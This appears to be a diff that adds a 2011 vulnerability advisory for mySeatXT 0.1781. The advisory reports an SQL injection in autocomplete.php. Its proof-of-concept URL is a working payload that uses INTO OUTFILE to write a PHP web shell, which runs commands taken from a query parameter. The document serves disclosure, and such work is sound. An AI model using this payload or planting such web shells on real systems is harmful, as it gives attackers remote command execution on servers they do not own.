@@ -1,0 +1,24 @@
+------------------------------------------------------------------------
+Software................mySeatXT 0.1781
+Vulnerability...........SQL Injection
+Threat Level............Critical (4/5)
+Download................http://sourceforge.net/projects/myseat/
+Discovery Date..........4/25/2011
+Tested On...............Windows Vista + XAMPP
+------------------------------------------------------------------------
+Author..................AutoSec Tools
+Site....................http://www.autosectools.com/
+Email...................John Leitch <john@autosectools.com>
+------------------------------------------------------------------------
+
+
+--Description--
+
+A SQL injection vulnerability in mySeatXT 0.1781 can be exploited to
+extract arbitrary data. In some environments it may be possible to
+create a PHP shell.
+
+
+--PoC--
+
+http://localhost/myseat/web/classes/autocomplete.php?field='%3C?php%20system($_GET[%22CMD%22]);%20?%3E'%20FROM%20dual%20INTO%20OUTFILE%20'../../htdocs/shell.php';%23&term=
